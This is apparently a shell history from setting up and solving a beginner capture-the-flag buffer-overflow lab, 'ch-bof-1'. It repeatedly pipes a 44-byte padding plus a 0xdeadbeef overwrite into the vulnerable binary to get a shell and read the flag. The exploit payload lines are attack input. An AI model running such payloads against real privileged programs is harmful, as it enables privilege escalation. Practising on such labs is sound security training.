sudo touch test
su root
exit
cd ch-bof-1
ls
cat <(python -c "print 'A'*44+'\xef\xbe\xda\xde'") - | ./ch-bof-1 
cat <(python -c "print 'A'*44+'\xef\xbe\xad\xde'") - | ./ch-bof-1 
chown ch-bof-1:ch-bof-1 ch-bof-1
sudo chown ch-bof-1:ch-bof-1 ch-bof-1
exit
cat <(python -c "print 'A'*44+'\xef\xbe\xad\xde'") - | ./ch-bof-1 
exit
cat <(python -c "print 'A'*44+'\xef\xbe\xad\xde'") - | ./ch-bof-1 
exit
cat <(python -c "print 'A'*44+'\xef\xbe\xad\xde'") - | ./ch-bof-1
mv * /home/ch-bof-1/
sudo mv * /home/ch-bof-1/
su -
su root
su -
sudo root
su user
cat ./ch-bof-1.c
cat ./flag-bof-1 
cat <(python -c "print 'A'*44+'\xef\xbe\xad\xde'") - | ./ch-bof-1 
cd ..
exit
ls
ls -la
./ch
exit
cd ch-bof-1
ls -la
cat ch.c
ls -la
./ch
echo $(python -c "print 'A'*44+'DDDD'") | ./ch
echo $(python -c "print 'A'*44+'\xef\xbe\xad\xde'") | ./ch
cat <($(python -c "print 'A'*44+'\xef\xbe\xad\xde'")) - | ./ch
cat <(python -c "print 'A'*44+'\xef\xbe\xad\xde'") - | ./ch
cd ..
exit
cd ch-bof-1
ls -la
cat ch.c
cat flag
python -c "print 'A'*44+'DDDD'" | ./ch
python -c "print 'A'*44+'\xef\xbe\xed\xda'" | ./ch
python -c "print 'A'*44+'\xef\xbe\xad\xde'" | ./ch
cat <(python -c "print 'A'*44+'\xef\xbe\xad\xde'") - | ./ch
cd ..
exit
su ch-bof-1-cracked
ls
cat ch.c 
cat <(python -c "print 'A'*44+'\xef\xbe\xad\xde'") - | ./ch 
exit
